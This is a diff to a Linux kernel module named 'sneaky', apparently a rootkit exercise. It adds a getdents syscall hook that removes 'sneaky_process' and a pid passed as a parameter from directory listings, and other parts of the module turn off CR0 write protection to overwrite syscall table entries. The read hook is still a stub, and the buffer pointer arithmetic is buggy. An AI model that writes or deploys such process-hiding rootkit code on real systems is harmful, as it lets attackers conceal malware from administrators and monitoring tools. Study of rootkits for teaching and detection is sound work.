@@ -17,6 +17,9 @@ struct linux_dirent {
 };
 
 MODULE_LICENSE("GPL");
+char * sneaky_pid;
+module_param(sneaky_pid, charp, 0);
+MODULE_PARM_DESC(pid, "sneaky_process 's pid");
 
 //Macros for kernel functions to alter Control Register 0 (CR0)
 //This CPU has the 0-bit of CR0 set to 1: protected mode is enabled.
@@ -50,44 +53,55 @@ asmlinkage int (*original_call)(const char * pathname, int flags);
 asmlinkage int sneaky_sys_open(const char * pathname, int flags) {
   printk(KERN_INFO "getting into sneaky_sys_open\n");
   return original_call(pathname, flags);
-  }
+}
 
 //------------------getdents-------------------------/
-asmlinkage int (*original_getdents)(unsigned int fd, struct linux_dirent *dirp, unsigned int count);
+asmlinkage int (*original_getdents)(unsigned int fd,
+                                    struct linux_dirent * dirp,
+                                    unsigned int count);
 
-asmlinkage int sneaky_sys_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count){
+asmlinkage int sneaky_sys_getdents(unsigned int fd,
+                                   struct linux_dirent * dirp,
+                                   unsigned int count) {
+  struct linux_dirent * d;
+  int nread, bpos;
   printk(KERN_INFO "getting into sneaky_sys_getdents\n");
-  int fd, nread;
-  struct linux_dirent *d;
 
-    nread = syscall(original_getdents, fd, dirp, count);
-    if (nread == -1){
-      printk(KERN_INFO "error: cannot operate original getdents");
+  nread = original_getdents(fd, dirp, count);
+  if (nread == -1) {
+    printk(KERN_INFO "error: cannot operate original getdents");
+  }
+  if (nread == 0) {
+    return 0;
+  }
+
+  for (bpos = 0; bpos < nread;) {
+    d = (struct linux_dirent *)(dirp + bpos);
+    if ((strcmp(d->d_name, "sneaky_process") == 0) ||
+        (strcmp(d->d_name, sneaky_pid) == 0)) {
+      memcpy(dirp + bpos, dirp + bpos + d->d_reclen, nread - (bpos + d->d_reclen));
+      nread -= d->d_reclen;
     }
-    if (nread == 0){
-      break;
-    }
-   
-    for (int bpos = 0; bpos < nread;) {
-      d = (struct linux_dirent *) (dirp + bpos);
-      
+    else {
       bpos += d->d_reclen;
     }
-  
-
-
+  }
+  return nread;
 }
 
 //------------------read-------------------------/
-asmlinkage ssize_t (*original_read)(int fd, void *buf, size_t count);
+asmlinkage ssize_t (*original_read)(int fd, void * buf, size_t count);
 
-asmlinkage sszie_t sneaky_sys_read(int fd, void *buf, size_t count){
+asmlinkage ssize_t sneaky_sys_read(int fd, void * buf, size_t count) {
+  ssize_t nread;
   printk(KERN_INFO "getting into sneaky_sys_read\n");
+  nread = original_read(fd, buf, count);
+  return nread;
 }
 
 //The code that gets executed when the module is loaded
 static int initialize_sneaky_module(void) {
-    struct page * page_ptr;
+  struct page * page_ptr;
 
   //See /var/log/syslog for kernel print output
   printk(KERN_INFO "Sneaky module being loaded.\n");
@@ -109,7 +123,7 @@ static int initialize_sneaky_module(void) {
   *(sys_call_table + __NR_getdents) = (unsigned long)sneaky_sys_getdents;
   original_read = (void *)*(sys_call_table + __NR_read);
   *(sys_call_table + __NR_read) = (unsigned long)sneaky_sys_read;
-  
+
   //Revert page to read-only
   pages_ro(page_ptr, 1);
   //Turn write protection mode back on
@@ -137,12 +151,11 @@ static void exit_sneaky_module(void) {
   *(sys_call_table + __NR_open) = (unsigned long)original_call;
   *(sys_call_table + __NR_getdents) = (unsigned long)original_getdents;
   *(sys_call_table + __NR_read) = (unsigned long)original_read;
-  
+
   //Revert page to read-only
   pages_ro(page_ptr, 1);
   //Turn write protection mode back on
   write_cr0(read_cr0() | 0x10000);
- 
 }
 
 module_init(initialize_sneaky_module);  // what's called upon loading
